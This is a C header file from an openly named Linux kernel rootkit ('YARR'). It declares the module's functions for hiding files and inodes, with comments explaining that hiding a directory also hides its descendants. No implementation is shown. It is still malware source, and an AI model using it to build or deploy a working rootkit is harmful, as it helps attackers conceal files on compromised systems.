/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_NINJA_FILES
#define __YARR_NINJA_FILES




void print_hide_files(void);



/***
 * Initializes everything related with hidding files. This function must be
 * called BEFORE using any other function specified here. Elsewhere behaviour
 * is undefined... and undefined behaviour in the kernel means reboot please.
 */
void init_hidefile(void);

/***
 * Liberate resources taken during the living of yarr inside the kernel (only
 * hide file related). This function should be called just during yarr unload.
 */
void exit_hidefile(void);

/***
 * Hides the specified file.
 *
 * @filename: The filename of the file to hide.
 * @return: Zero on success or -1 if there were errors.
 */
int hideFile(const char __user *filename);

/***
 * Stops hidding the specified file.
 *
 * @filename: The filename of the file to stop hidding.
 * @return: Zero on success or -1 if there were errors.
 */
int stopHideFile(const char __user *filename);

/***
 * Tells whether a file is being (should be) hidden or not. A file is hidden if
 * yarr has been asked to hide it or any one of his fathers. For example if
 * yarr is requested to hide /path/dir (a directory) and then someone try to
 * access /path/dir/file (suppose it exists) it will be hidden because its
 * ascendant /path/dir is hidden.
 *
 * @filename: The filename of the file to check for.
 * @return: Zero if the file is not being hidden or non-zero elsewhere.
 */
int isFileHidden(const char __user *filename);

// TODO: This function shouldn't exist, check todo in the implementation.
/***
 * Tells whether an inode is being hidden or not.
 *
 * @inode: The inode number to search for.
 * @return: Zero if inode is not being hidden or non-zero if so.
 */
int isInodeHidden(long inode);

#endif /* __YARR_NINJA_FILES. */

